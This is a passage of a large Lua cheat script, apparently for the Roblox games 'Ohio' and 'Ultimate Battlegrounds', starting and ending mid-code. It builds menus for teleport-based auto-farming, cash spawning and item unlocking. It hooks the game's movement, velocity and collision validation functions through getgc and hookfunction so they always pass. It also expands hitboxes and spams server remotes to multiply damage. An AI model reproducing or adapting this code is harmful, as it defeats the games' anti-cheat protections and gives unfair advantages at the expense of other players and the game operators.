										if fn104(tbl31.AutoFarm.Tasks, "Permanent Item") then
											if arg == "Military Armory Keycard" or arg == "Police Armory Keycard" then
												return not fn73(arg)
											end

											if v46 and v46.permanent then
												return true, "Permanent Item"
											end
										end

										if fn104(tbl31.AutoFarm.Tasks, "Price Item") then
											local sellPrice = v46 and v46.sellPrice
											local num = tonumber(sellPrice)

											if num then
												local minPrice = tbl31.AutoFarm.MinPrice
												num = tonumber(sellPrice) >= minPrice
											end

											if num then
												return fn81(fn147(arg2)), "Price Item"
											end
										end

										if fn104(tbl31.AutoFarm.Tasks, "Cash") and (arg == "Cash" or arg == "Money") then
											local n13 = arg2 and FindFirstChild(arg2, "Cash") and arg2.Cash.Value or 0
											local flag4 = tonumber(n13) == nil

											if not flag4 then
												local minCash = tbl31.AutoFarm.MinCash
												flag4 = tonumber(n13) >= minCash
											end

											return flag4, "Cash"
										end

										if fn104(tbl31.AutoFarm.Tasks, "Present") and arg:find("Present") then
											return true, "Present"
										end

										if fn104(tbl31.AutoFarm.Tasks, "Luck Block") and arg:find("Lucky") then
											return true, "Luck Block"
										end

										if fn104(tbl31.AutoFarm.Tasks, "Component Box") and arg == "Component Box" then
											return true, "Component Box"
										end

										if fn104(tbl31.AutoFarm.Tasks, "Stash Gem") and v46 and (v46.subtype == "gem" or v46.subtype == "valuable") then
											return (tonumber(v46 and v46.sellPrice) or 0) >= tbl31.AutoFarm.MinStashPrice, "Stash Gem"
										end
										return false, "Stash Gem"
									end

									local function fn149(arg)
										local v46 = fn147(arg)
										if not v46 then
											return
										end
										local v47 = fn71()
										local v48 = fn70()
										if not v47 or not v48 then
											return
										end

										if not fn81(v46) then
											return
										end

										if not fn82(v46) then
											return
										end
										local cFrame = v47.CFrame
										v48:ChangeState(Enum.HumanoidStateType.Jumping)
										v47.CFrame = v46.CFrame * NewCFrame(0, -4, 0)
										v47.AssemblyLinearVelocity = EmptyVector3

										for i = 1, 3 do
											fn105(v46)
											Wait(0.1)
										end

										if v47 and v47.Parent then
											v47.CFrame = cFrame
											v47.AssemblyLinearVelocity = EmptyVector3
										end
									end

									local function fn150()
										if not fn124() then
											return
										end

										if not FindFirstChild(workspace, "Game") or not fn71() then
											return
										end
										fn128()
										fn129()
										fn130()

										if fn104(tbl31.AutoFarm.Tasks, "Item") or fn104(tbl31.AutoFarm.Tasks, "Permanent Item") or fn104(tbl31.AutoFarm.Tasks, "Price Item") or fn104(tbl31.AutoFarm.Tasks, "Cash") or fn104(tbl31.AutoFarm.Tasks, "Present") or fn104(tbl31.AutoFarm.Tasks, "Luck Block") or fn104(tbl31.AutoFarm.Tasks, "Component Box") or fn104(tbl31.AutoFarm.Tasks, "Stash Gem") then
											local v46 = fn103()

											for i = 1, #v46 do
												local v47 = v46[i]

												if fn148(GetAttribute(v47, "itemName"), v47) then
													local v48 = fn147(v47)
													if fn81(v48) then
														fn149(v47)
														break
													end
												end
											end
										end

										local flag4 = false

										if fn104(tbl31.AutoFarm.Tasks, "JewelryCase") then
											flag4 = tbl38.runAutoFarmHighValue()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Stash Gem") then
											fn135()
										end

										if fn104(tbl31.AutoFarm.Tasks, "ATM") then
											fn132()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Safe") then
											fn133()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Money Printer") then
											fn138()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Bank") then
											fn131()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Treasure") then
											fn139()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Spin") then
											fn140()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Cash Register") then
											fn143()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Airdrop") then
											fn142()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Vehicle") then
											fn144()
										end

										if fn104(tbl31.AutoFarm.Tasks, "JewelryCase") and not flag4 then
											tbl38.runAutoFarmRefresh()
										end

										if fn104(tbl31.AutoFarm.Tasks, "Job") or fn104(tbl31.AutoFarm.Tasks, "Work") then
											fn141()
										else
											fn80(NewCFrame(NewVector3(1598.2271728515625, -39.155593872070312, -250.66340637207031)), 0.01)
										end
									end

									local tbl39 = {}
									local str3 = "RollieCraft"
									local n13 = 35
									local n14 = 5
									local n15 = 0
									local v46 = nil

									local function fn151()
										return (GetAttribute(LocalPlayer, "component_refinedMetal") or 0) >= n13
									end

									local function fn152(arg)
										if not arg then
											return false
										end

										if GetAttribute(LocalPlayer, "currentCraft") then
											return false
										end

										if tick() - n15 < n14 then
											return false
										end
										local ok4, result4 = pcall(InvokeServer, "beginCraft", arg)
										if ok4 and result4 then
											n15 = tick()
											return true
										end
										return false
									end

									local function fn153()
										local v47 = LocalPlayer
										if GetAttribute(v47, "currentCraft") ~= str3 then
											return false
										end

										if GetAttribute(v47, "currentCraftClaimed") then
											return false
										end
										local n16 = GetAttribute(v47, "craftCompletionTime") or 0
										if n16 == 0 or os.time() <= n16 then
											return false
										end
										local ok4, result4 = pcall(InvokeServer, "claimCraft")
										return ok4 and result4
									end

									local function fn154()
										pcall(task.cancel, v46)
										v46 = nil
										if not (tbl31.AutoFarm.Enabled and fn104(tbl31.AutoFarm.Tasks, "Craft Rollie")) then
											return
										end

										v46 = Spawn(function()
											while tbl31.AutoFarm.Enabled and fn104(tbl31.AutoFarm.Tasks, "Craft Rollie") do
												local ok4, result4 = pcall(function()
													local v47 = LocalPlayer

													if GetAttribute(v47, "currentCraft") == str3 then
														fn153()
													elseif not GetAttribute(v47, "currentCraft") and fn151() then
														fn152("RollieCraft")
													end
												end)

												if not ok4 then
													warn("[OhioCraftRollie] " .. tostring(result4))
												end

												Wait(5)
											end
										end)
									end

									local function fn155()
										pcall(task.cancel, v40)
										v40 = nil
										pcall(task.cancel, v46)
										v46 = nil
										if not tbl31.AutoFarm.Enabled then
											return
										end

										v40 = Spawn(function()
											while tbl31.AutoFarm.Enabled do
												local ok4, result4 = pcall(fn150)

												if not ok4 then
													warn("[OhioAutoFarm] " .. tostring(result4))
												end

												Wait(0.1)
											end
										end)

										Spawn(function()
											while tbl31.AutoFarm.Enabled and Wait() do
												if fn104(tbl31.AutoFarm.Tasks, "Permanent Item") then
													local v47 = fn103()

													for i = 1, #v47 do
														flag3 = true
														local v48 = v47[i]
														local v49 = GetAttribute(v48, "itemName")

														if not (not v49 or tbl39[v49]) then
															local v50, v51 = fn148(v49, v48)

															if v50 and v51 == "Permanent Item" then
																local v52 = fn147(v48)
																if fn81(v52) then
																	fn149(v48)
																	break
																end
															else
																tbl39[v49] = true
															end
														end
													end
												end

												flag3 = false
											end
										end)

										fn154()
									end

									local function fn156()
										pcall(task.cancel, v41)
										v41 = nil
										if not fn117() then
											return
										end

										v41 = Spawn(function()
											while fn117() do
												pcall(function()
													local v47 = pairs
													local items = inventory.items or {}

													for _, item in v47(items) do
														if item and item.guid and item.name and not item.isStashed and item.name ~= "Treasure Map" then
															local useIgnore = tbl31.AutoSell.UseIgnore and fn104(tbl31.AutoSell.Ignore, item.name)

															if tbl31.AutoSell.Enabled and tick() - n7 >= 60 and not tbl11[item.guid] then
																if item.sellPrice and item.sellPrice <= tbl31.AutoSell.Max and not useIgnore then
																	fn76(item.guid)
																	FireServer("sellItem", item.guid)
																end
															end

															if tbl31.AutoUse and tbl35[item.name] then
																fn76(item.guid)
																FireServer("useConsumable", item.guid)
																fn77(item.guid)
															end

															if (tbl31.AutoRemove or tbl31.AutoDisassemble) and (tbl36[item.name] or (item.name == "Candy Cane" and 1 or 0) > 1) then
																if tbl31.AutoDisassemble then
																	InvokeServer("craftingDisassemble", { [item.guid] = 1 })
																end

																if tbl31.AutoRemove then
																	fn77(item.guid)
																end
															end
														end
													end
												end)

												Wait(0.35)
											end
										end)
									end

									local function fn157()
										pcall(task.cancel, v44)
										v44 = nil
										if not tbl31.AutoDumbell then
											return
										end

										v44 = Spawn(function()
											while tbl31.AutoDumbell do
												if fn69() and not fn87(LocalPlayer) then
													local Dumbell = fn72("Dumbell")

													if Dumbell then
														fn76(Dumbell.guid)
														FireServer("liftDumbell")
													else
														fn93("Dumbell")
													end
												end

												Wait(0.2)
											end
										end)
									end

									v38:CreateModule({
										Id = "ohio-farm-admin-check",
										Name = "Admin Check",
										Default = tbl31.AdminCheck,
										Callback = function(adminCheck)
											tbl31.AdminCheck = adminCheck
											fn120()
										end,
									}):CreateToggle({
										Id = "ohio-farm-auto-leave",
										Name = "Auto Leave",
										Default = tbl31.AutoLeave,
										Callback = function(autoLeave)
											tbl31.AutoLeave = autoLeave
										end,
									})

									v38:CreateModule({
										Id = "ohio-farm-auto-rewards",
										Name = "Auto Rewards",
										Default = tbl31.AutoRewards,
										Callback = function(autoRewards)
											tbl31.AutoRewards = autoRewards
											fn122()
										end,
									})

									v38:CreateModule({
										Id = "ohio-farm-auto-mask",
										Name = "Auto Mask",
										Default = tbl31.AutoMask.Enabled,
										Callback = function(enabled)
											tbl31.AutoMask.Enabled = enabled
											fn123()
										end,
									}):CreateSelector({
										Id = "ohio-farm-mask",
										Name = "Mask",
										Options = {
											{ Value = "Hockey Mask" },
											{ Value = "Surgeon Mask" },
											{ Value = "Black Bandana" },
											{ Value = "Blue Bandana" },
											{ Value = "Red Bandana" },
										},
										Default = tbl31.AutoMask.Mask,
										Callback = function(mask)
											tbl31.AutoMask.Mask = mask
										end,
									})

									local v47 = v38:CreateModule({
										Id = "ohio-farm-aura",
										Name = "Farm Aura",
										Default = tbl31.FarmAura.Enabled,
										Callback = function(enabled)
											tbl31.FarmAura.Enabled = enabled
											fn146()
										end,
									})

									local tbl40 = {
										"LockPick",
										"Item",
										"JewelryCase",
										"Cash",
										"Safe",
										"ATM",
										"Airdrop",
										"Work",
										"Cash Register",
										"Vehicle",
										"Job",
									}

									for i = 1, #tbl40 do
										local v48 = tbl40[i]
										local str4 = v48:lower():gsub("[^%w]+", "_")

										v47:CreateToggle({
											Id = "ohio-farm-aura-" .. str4,
											Name = v48,
											NameKey = "ohio_farm_aura_" .. str4,
											Default = fn104(tbl31.FarmAura.Options, v48),
											Callback = function(arg)
												fn114(tbl31.FarmAura.Options, v48, arg)
											end,
										})
									end

									local v48 = v38:CreateModule({
										Id = "ohio-farm-auto-farm",
										Name = "Auto Farm",
										Default = tbl31.AutoFarm.Enabled,
										Callback = function(enabled)
											tbl31.AutoFarm.Enabled = enabled
											fn155()
										end,
									})

									v48:CreateSlider({
										Id = "ohio-farm-min-stash-price",
										Name = "Min Stash Price",
										Min = 20,
										Max = 20000,
										Default = tbl31.AutoFarm.MinStashPrice,
										Step = 1,
										Callback = function(minStashPrice)
											tbl31.AutoFarm.MinStashPrice = minStashPrice
										end,
									})

									v48:CreateSlider({
										Id = "ohio-farm-min-price",
										Name = "Min Farm Price",
										Min = 20,
										Max = 20000,
										Default = tbl31.AutoFarm.MinPrice,
										Step = 1,
										Callback = function(minPrice)
											tbl31.AutoFarm.MinPrice = minPrice
										end,
									})

									v48:CreateSlider({
										Id = "ohio-farm-min-cash",
										Name = "Min Farm Cash",
										Min = 20,
										Max = 20000,
										Default = tbl31.AutoFarm.MinCash,
										Step = 1,
										Callback = function(minCash)
											tbl31.AutoFarm.MinCash = minCash
										end,
									})

									local tbl41 = {
										"Stash Gem",
										"Permanent Item",
										"JewelryCase",
										"Money Printer",
										"Treasure",
										"Bank",
										"Bomb Robbery",
										"Cash",
										"Airdrop",
										"Price Item",
										"Safe",
										"Vehicle",
										"ATM",
										"Cash Register",
										"Present",
										"Luck Block",
										"Spin",
										"Component Box",
										"Craft Rollie",
										"Job",
									}

									for i = 1, #tbl41 do
										local v49 = tbl41[i]
										local str4 = v49:lower():gsub("[^%w]+", "_")

										v48:CreateToggle({
											Id = "ohio-farm-task-" .. str4,
											Name = v49,
											NameKey = "farm_task_" .. str4,
											Default = fn104(tbl31.AutoFarm.Tasks, v49),
											Callback = function(arg)
												fn114(tbl31.AutoFarm.Tasks, v49, arg)

												if v49 == "Craft Rollie" then
													fn154()
												end
											end,
										})
									end

									local v49 = v38:CreateModule({
										Id = "ohio-farm-auto-sell",
										Name = "Auto Sell",
										Default = tbl31.AutoSell.Enabled,
										Callback = function(enabled)
											tbl31.AutoSell.Enabled = enabled
											fn156()
										end,
									})

									v49:CreateToggle({
										Id = "ohio-farm-use-ignore",
										Name = "Use Ignore",
										Default = tbl31.AutoSell.UseIgnore,
										Callback = function(useIgnore)
											tbl31.AutoSell.UseIgnore = useIgnore
										end,
									})

									v49:CreateSlider({
										Id = "ohio-farm-max-sell",
										Name = "Max Sell",
										Min = 20,
										Max = 20000,
										Default = tbl31.AutoSell.Max,
										Step = 1,
										Callback = function(max)
											tbl31.AutoSell.Max = max
										end,
									})

									local tbl42 = {
										"AS Val",
										"AUG",
										"AWP",
										"Barrett M107",
										"FN FAL",
										"M1 Garand",
										"M249 SAW",
										"P90",
										"Scar L",
										"Raygun",
										"RPG",
										"Treasure Map",
										"Fire Extinguisher",
									}

									for i = 1, #tbl42 do
										local v50 = tbl42[i]
										local str4 = v50:lower():gsub("[^%w]+", "_")

										v49:CreateToggle({
											Id = "ohio-farm-sell-ignore-" .. str4,
											Name = v50,
											NameKey = "ohio_farm_auto_sell_ignore_" .. str4,
											Default = fn104(tbl31.AutoSell.Ignore, v50),
											Callback = function(arg)
												fn114(tbl31.AutoSell.Ignore, v50, arg)
											end,
										})
									end

									v38:CreateModule({
										Id = "ohio-farm-auto-use",
										Name = "Auto Use",
										Default = tbl31.AutoUse,
										Callback = function(autoUse)
											tbl31.AutoUse = autoUse
											fn156()
										end,
									})

									v38:CreateModule({
										Id = "ohio-farm-auto-disassemble",
										Name = "Auto Disassemble",
										Default = tbl31.AutoDisassemble,
										Callback = function(autoDisassemble)
											tbl31.AutoDisassemble = autoDisassemble
											fn156()
										end,
									})

									v38:CreateModule({
										Id = "ohio-farm-auto-remove",
										Name = "Auto Remove",
										Default = tbl31.AutoRemove,
										Callback = function(autoRemove)
											tbl31.AutoRemove = autoRemove
											fn156()
										end,
									})

									v38:CreateModule({
										Id = "ohio-farm-auto-dumbell",
										Name = "Auto Dumbell",
										Default = tbl31.AutoDumbell,
										Callback = function(autoDumbell)
											tbl31.AutoDumbell = autoDumbell
											fn157()
										end,
									})
								end

								fn115()
								local v39 = v14:CreateTab({ Id = "ohio-misc", Name = "Ohio Misc" })

								local function fn116()
									local tbl31 = {
										JoinPlr = "",
										NoCameraShake = true,
										BlockVFX = {},
										SpawnCash = 10000,
										FakeCash = { Enabled = false, Cash = 9178666 },
										FakeWallet = "None",
										FakeBalloon = "None",
										Beautify = { Enabled = false, BalloonTarget = nil, Kunai = false, CandyCane = false, Scythe = false },
										GetGun = {},
										GetBalloon = {},
										GetKunai = {},
									}

									local function fn117(arg)
										local tbl32 = { "None" }
										arg = arg or {}

										for i = 1, #arg do
											Insert(tbl32, arg[i])
										end

										return tbl32
									end

									local function fn118(arg)
										if arg then
											CameraShaker.new = function()
												return setmetatable({}, { __index = function()
													return function()
													end
												end })
											end
										else
											CameraShaker.new = new
										end
									end

									fn118(tbl31.NoCameraShake)

									v39:CreateModule({
										Id = "ohio-misc-anti-sticky-lag",
										Name = "Anti Sticky Lag",
										Default = true,
										Callback = function(arg)
											if not arg then
												pcall(function()
													workspace.Game.Local.stickymodded.Name = "sticky"
												end)

												return
											end

											pcall(function()
												workspace.Game.Local.sticky.Name = "stickymodded"
											end)
										end,
									})

									v39:CreateModule({ Id = "ohio-misc-join-server", Name = "Join Server" }):CreateButton({
										Id = "ohio-misc-join-vc-server",
										Name = "VC Server",
										Callback = function()
											FireServer("teleportVC")
										end,
									})

									local v40 = v39:CreateModule({ Id = "ohio-misc-join-player", Name = "Join Player" })

									v40:CreateInput({
										Id = "ohio-misc-join-plr-input",
										Name = "Player Name/ID",
										Default = tbl31.JoinPlr,
										Placeholder = "UserName/UserId",
										Callback = function(arg)
											local flag4 = typeof(arg) == "string" and arg
											local str3

											if flag4 then
												str3 = flag4
											else
												str3 = tostring(arg or "")
											end

											tbl31.JoinPlr = string.gsub(string.gsub(str3, "^%s+", ""), "%s+$", "")
										end,
									})

									v40:CreateButton({
										Id = "ohio-misc-join-plr-btn",
										Name = "Join",
										Callback = function()
											local joinPlr = tbl31.JoinPlr
											if not joinPlr or joinPlr == "" then
												return
											end
											local num = tonumber(joinPlr)

											if not num then
												local ok4, result4 = pcall(function()
													return Players:GetUserIdFromNameAsync(joinPlr)
												end)

												if ok4 then
													num = result4
												end
											end

											if num then
												FireServer("joinServer", num)
											end
										end,
									})

									v39:CreateModule({
										Id = "ohio-misc-no-camera-shake",
										Name = "No Camera Shake",
										Default = tbl31.NoCameraShake,
										Callback = function(noCameraShake)
											tbl31.NoCameraShake = noCameraShake
											fn118(noCameraShake)
										end,
									})

									local v41 = v39:CreateModule({ Id = "ohio-misc-block-vfx", Name = "Block VFX" })

									for i = 1, #tbl13 do
										local v42 = tbl13[i]
										local str3 = v42:lower():gsub("[^%w]+", "_")

										v41:CreateToggle({
											Id = "ohio-misc-block-vfx-" .. str3,
											Name = v42,
											NameKey = "ohio_misc_block_vfx_" .. str3,
											Default = fn104(tbl31.BlockVFX, v42),
											Callback = function(arg)
												fn114(tbl31.BlockVFX, v42, arg)
												tbl27 = fn83(tbl31.BlockVFX)
											end,
										})
									end

									local v42 = v39:CreateModule({ Id = "ohio-misc-spawn-cash", Name = "Spawn Cash" })

									v42:CreateInput({
										Id = "ohio-misc-spawn-cash-input",
										Name = "Amount",
										Default = tbl31.SpawnCash,
										Placeholder = "Number",
										Callback = function(arg)
											tbl31.SpawnCash = tonumber(arg) or tbl31.SpawnCash
										end,
									})

									v42:CreateButton({
										Id = "ohio-misc-spawn-cash-btn",
										Name = "Spawn",
										Callback = function()
											fn88(tbl31.SpawnCash)
										end,
									})

									v39:CreateModule({
										Id = "ohio-misc-fake-cash",
										Name = "Fake Cash",
										Callback = function(enabled)
											tbl31.FakeCash.Enabled = enabled
											pcall(task.cancel, ohioFakeMoneyTask)
											ohioFakeMoneyTask = nil

											if enabled then
												ohioFakeMoneyTask = Spawn(function()
													while tbl31.FakeCash.Enabled do
														updateMoney(nil, nil, tonumber(tbl31.FakeCash.Cash) or 0)
														Wait()
													end
												end)
											end
										end,
									}):CreateInput({
										Id = "ohio-misc-fake-cash-input",
										Name = "Amount",
										Default = tbl31.FakeCash.Cash,
										Placeholder = "Number",
										Callback = function(arg)
											tbl31.FakeCash.Cash = tonumber(arg) or tbl31.FakeCash.Cash
										end,
									})

									v39:CreateModule({ Id = "ohio-misc-unlock-skin", Name = "Unlock Skin" }):CreateButton({
										Id = "ohio-misc-unlock-skin",
										Name = "Unlock",
										Callback = function()
											fn89()
										end,
									})

									local tbl32 = {}
									local v43 = fn117(tbl21)

									for i = 1, #v43 do
										local v44 = v43[i]
										Insert(tbl32, { Value = v44, Key = v44:lower():gsub("[^%w]+", "_") })
									end

									v39:CreateModule({ Id = "ohio-misc-fake-wallet", Name = "Fake Wallet" }):CreateSelector({
										Id = "ohio-misc-fake-wallet",
										Name = "Wallet",
										Options = tbl32,
										Default = tbl31.FakeWallet,
										Callback = function(fakeWallet)
											tbl31.FakeWallet = fakeWallet
											fn90(fakeWallet)
										end,
									})

									local tbl33 = {}
									local v44 = fn117(tbl17)

									for i = 1, #v44 do
										local v45 = v44[i]
										Insert(tbl33, { Value = v45, Key = v45:lower():gsub("[^%w]+", "_") })
									end

									local v45 = v39:CreateModule({
										Id = "ohio-misc-beautify-items",
										Name = "Beautify Items",
										Default = tbl31.Beautify.Enabled,
										Callback = function(arg)
											tbl31.Beautify.Enabled = arg == true
											fn92(arg == true)
										end,
									})

									local tbl34 = {}
									local tbl35 = {}

									for i = 1, #tbl17 do
										local v46 = tbl17[i]

										if v46 and not tbl35[v46] then
											tbl35[v46] = true
											Insert(tbl34, v46)
										end
									end

									for i = 1, #tbl19 do
										local v46 = tbl19[i]

										if v46 and not tbl35[v46] then
											tbl35[v46] = true
											Insert(tbl34, v46)
										end
									end

									for i = 1, #tbl34 do
										local v46 = tbl34[i]

										v45:CreateButton({
											Id = "ohio-misc-beautify-balloon-" .. v46:lower():gsub("[^%w]+", "_"),
											Name = "Balloon → " .. v46,
											Callback = function()
												tbl26.BalloonTarget = v46
												tbl31.Beautify.BalloonTarget = v46

												if flag then
													fn91(true, true)
												end
											end,
										})
									end

									v45:CreateButton({
										Id = "ohio-misc-beautify-kunai-spirit",
										Name = "Kunai → Spirit Kunai",
										Callback = function()
											tbl26.Kunai = true
											tbl31.Beautify.Kunai = true

											if flag then
												fn91(true, true)
											end
										end,
									})

									v45:CreateButton({
										Id = "ohio-misc-beautify-candy-blue",
										Name = "Candy Cane → Blue Candy Cane",
										Callback = function()
											tbl26.CandyCane = true
											tbl31.Beautify.CandyCane = true

											if flag then
												fn91(true, true)
											end
										end,
									})

									v45:CreateButton({
										Id = "ohio-misc-beautify-scythe-spectral",
										Name = "Scythe → Spectral Scythe",
										Callback = function()
											tbl26.Scythe = true
											tbl31.Beautify.Scythe = true

											if flag then
												fn91(true, true)
											end
										end,
									})

									local v46 = v39:CreateModule({ Id = "ohio-misc-get-gun", Name = "Get Gun" })

									for i = 1, #tbl15 do
										local v47 = tbl15[i]
										local str3 = v47:lower():gsub("[^%w]+", "_")

										v46:CreateToggle({
											Id = "ohio-misc-get-gun-" .. str3,
											Name = v47,
											NameKey = "ohio_misc_get_gun_" .. str3,
											Default = fn104(tbl31.GetGun, v47),
											Callback = function(arg)
												fn114(tbl31.GetGun, v47, arg)
												tbl22 = fn83(tbl31.GetGun)
												fn84(tbl14, tbl22)
											end,
										})
									end

									local v47 = v39:CreateModule({ Id = "ohio-misc-buy-gun", Name = "Buy Gun" })

									for i = 1, #tbl15 do
										local v48 = tbl15[i]

										v47:CreateButton({
											Id = "ohio-misc-buy-gun-" .. v48:lower():gsub("[^%w]+", "_"),
											Name = v48,
											Callback = function()
												if fn72(v48) then
													Spawn(fn93, v48, true)
												else
													Spawn(fn93, v48)
												end
											end,
										})
									end

									local v48 = v39:CreateModule({ Id = "ohio-misc-get-balloon", Name = "Get Balloon" })

									for i = 1, #tbl17 do
										local v49 = tbl17[i]
										local str3 = v49:lower():gsub("[^%w]+", "_")

										v48:CreateToggle({
											Id = "ohio-misc-get-balloon-" .. str3,
											Name = v49,
											NameKey = "ohio_misc_get_balloon_" .. str3,
											Default = fn104(tbl31.GetBalloon, v49),
											Callback = function(arg)
												fn114(tbl31.GetBalloon, v49, arg)
												tbl23 = fn83(tbl31.GetBalloon)
												fn84(tbl16, tbl23)
											end,
										})
									end

									local v49 = v39:CreateModule({ Id = "ohio-misc-get-kunai", Name = "Get Kunai" })

									for i = 1, #tbl19 do
										local v50 = tbl19[i]
										local str3 = v50:lower():gsub("[^%w]+", "_")

										v49:CreateToggle({
											Id = "ohio-misc-get-kunai-" .. str3,
											Name = v50,
											NameKey = "get_kunai_" .. str3,
											Default = fn104(tbl31.GetKunai, v50),
											Callback = function(arg)
												fn114(tbl31.GetKunai, v50, arg)
												tbl24 = fn83(tbl31.GetKunai)
												fn84(tbl18, tbl24)
											end,
										})
									end

									fn86()
								end

								fn116()
							end
						end,
						["Ultimate Battlegrounds"] = function()
							local Core = require(ReplicatedStorage:WaitForChild("Core"))
							local playerScripts = LocalPlayer:WaitForChild("PlayerScripts")
							local Hit = require(playerScripts.Combat.Hit)
							local VFXHelp = require(ReplicatedStorage:WaitForChild("Assets"):WaitForChild("VFXHelp"))
							local sound = playerScripts:WaitForChild("Cache"):WaitForChild("Sound")
							local console = playerScripts:WaitForChild("Test"):WaitForChild("Console")
							local tbl10 = { "validatecollisions", "validatemovement", "validatevelocity", "validate" }

							Spawn(function()
								Wait()
								local v27 = next
								local v28, v29 = getgc(true)

								for _, v30 in v27, v28, v29 do
									if typeof(v30) == "function" then
										local v31 = debug.getinfo(v30)

										if v31.name then
											if Find(tbl10, v31.name:lower()) then
												local v32 = hookfunction

												local v33 = luraph_runtime1(function()
													return true
												end)

												v32(v30, v33)
											end

											local source = v31.source

											if source and source:lower():find("block") then
												if v31.name:lower() == "check" then
													checkBlock = v30
												end
											end
										end
									end
								end
							end)

							if checkBlock then
								Connect(RunService.Heartbeat, checkBlock)
								fn7("No Delay Block", "Failed", 5)
							else
								fn7("No Delay Block", "Success", 5)
							end

							local v27 = v14:CreateTab({ Id = "ubg-settings", Name = "UBG Settings" })

							local tbl11 = {
								Hitbox = false,
								Legit = false,
								Visualize = false,
								DashPatch = false,
								DamageBoost = 0,
								SizeX = 5,
								SizeY = 5,
								SizeZ = 5,
								SilentBlock = false,
								FakeLag = false,
								FakeLagModule = nil,
								FakeLagInterval = 0.1,
							}

							local box = nil
							local process = nil
							local event = nil

							local tbl12 = {
								EarlyThreshold = 0.2625,
								UppercutThreshold = 0.375,
								ForceRagdollAction = true,
								ForceDirection = true,
								ClearKnockback = true,
								UseFromCFrame = true,
							}

							local v28 = nil
							local v29 = nil
							local flag = false

							local function fn68(arg, arg2)
								local isExcludedCharacter = getgenv and getgenv().isExcludedCharacter
								if typeof(isExcludedCharacter) ~= "function" then
									return arg, arg2
								end

								if arg and isExcludedCharacter(arg) then
									arg = nil
								end

								if type(arg2) == "table" then
									for i = #arg2, 1, -1 do
										if isExcludedCharacter(arg2[i]) then
											Remove(arg2, i)
										end
									end
								end

								return arg, arg2
							end

							local function fn69(arg)
								local v30 = arg or EmptyVector3
								return NewVector3(v30.X + tbl11.SizeX, v30.Y + tbl11.SizeY, v30.Z + tbl11.SizeZ)
							end

							local function fn70(arg, size)
								if not tbl11.Visualize then
									return
								end
								local cFrame = arg[3].CFrame or arg[3].cf or arg[3].Frame

								if not cFrame and typeof(arg[2]) == "CFrame" then
									cFrame = arg[2]
								elseif not cFrame and typeof(arg[2]) == "Instance" and arg[2]:IsA("BasePart") then
									cFrame = arg[2].CFrame
								end

								if not cFrame then
									local character = LocalPlayer.Character
									cFrame = character and FindFirstChild(character, "HumanoidRootPart")
									cFrame = cFrame and cFrame.CFrame or NewCFrame()
								end

								local Part = NewInstance("Part")
								Part.Name = "HitboxVisualizer"
								Part.Anchored = true
								Part.CanCollide = false
								Part.Material = Enum.Material.ForceField
								Part.Color = NewRGB(255, 0, 0)
								Part.Transparency = 0.7
								Part.Size = size
								Part.CFrame = cFrame
								Part.CastShadow = false
								Part.Parent = workspace
								Debris:AddItem(Part, 0.08)
							end

							local function fn71(arg)
								if type(Hit.Box) ~= "function" then
									return
								end

								if not box then
									box = Hit.Box
								end

								if not event then
									event = Core.Get("Combat", "Action").Event
								end

								if arg then
									Hit.Box = function(...)
										local v30 = table.pack(...)
										local tbl13 = { ... }
										if not tbl13[3] or type(tbl13[3]) ~= "table" then
											return box(table.unpack(v30, 1, v30.n))
										end
										local v31 = fn69(tbl13[3].Size)
										fn70(tbl13, v31)

										if tbl11.Legit then
											local tbl14 = {}

											for k, v32 in pairs(tbl13[3]) do
												tbl14[k] = v32
											end

											tbl14.Size = v31
											local v32, v33, v34 = box(tbl13[1], tbl13[2], tbl14)
											local v35, v36 = fn68(v32, v33)
											return v35, v36, v34
										end

										local v32, v33, v34 = box(tbl13[1], tbl13[2], { Size = v31 })
										local v35, v36 = fn68(v32, v33)
										return v35, v36, v34
									end

									Core.Get("Combat", "Action").Event = function(arg2, arg3, arg4, arg5, arg6, ...)
										if arg6 then
											local v30 = nil

											if arg6.RunOnUpdate then
												local runOnUpdate = arg6.RunOnUpdate

												arg6.RunOnUpdate = function(arg7, arg8)
													if not v30 then
														local v31 = Core.Get("Combat", "Hit").Box(nil, arg7, { Size = NewVector3(6, 3.5, 6), Offset = NewCFrame() }, {}, nil, nil, nil, nil, nil, nil)

														if v31 then
															v30 = v31
														end
													end

													return runOnUpdate(arg7, arg8)
												end
											end

											if arg6.RunBeforeActions then
												local runBeforeActions = arg6.RunBeforeActions

												arg6.RunBeforeActions = function(arg7, arg8, arg9)
													return runBeforeActions(v30 or arg7, arg8, arg9)
												end
											end
										end

										local v30 = event
										local v31 = table.pack(...)
										v31.n = 6 + v31.n - 1
										table.move(v31, 1, v31.n, 6, v31)
										v31[1] = arg2
										v31[2] = arg3
										v31[3] = arg4
										v31[4] = arg5
										v31[5] = arg6
										return v30(table.unpack(v31, 1, v31.n))
									end
								elseif box then
									Hit.Box = box
									Core.Get("Combat", "Action").Event = event
								end
							end

							local function fn72()
								local v30 = FindFirstChild(LocalPlayer, "Data")
								local value = v30 and FindFirstChild(v30, "Character")
								value = value and value.Value
								local v31 = FindFirstChild(ReplicatedStorage, "Characters")
								local v32 = v31 and value and FindFirstChild(v31, value)
								return v32 and FindFirstChild(v32, "WallCombo")
							end

							local function fn73()
								if tbl11.Legit then
									return
								end
								local character = LocalPlayer.Character
								local v30 = character and FindFirstChild(character, "HumanoidRootPart")
								if not v30 then
									return
								end

								pcall(function()
									local cFrame = v30.CFrame
									Core.Library("Remote").Send("Dash", cFrame, "L", 1)
								end)
							end

							local function fn74(arg)
								local v30 = FindFirstChild(ReplicatedStorage, "Remotes")
								local v31 = v30 and FindFirstChild(v30, "Abilities")
								v30 = v30 and FindFirstChild(v30, "Combat")
								local v32 = v31 and FindFirstChild(v31, "Ability")
								local v33 = v30 and FindFirstChild(v30, "Action")
								if not v32 or not v33 then
									return
								end
								local v34 = fn72()
								local v35 = Floor(tbl11.DamageBoost)

								if v35 <= 0 then
									v32:FireServer(nil, 69)
									v33:FireServer(nil, "", 4, 69, { BestHitCharacter = nil, HitCharacters = arg, Ignore = {}, Actions = {} })
									return
								end

								if not v34 then
									return
								end

								for i = 1, v35 do
									v32:FireServer(v34, 69)
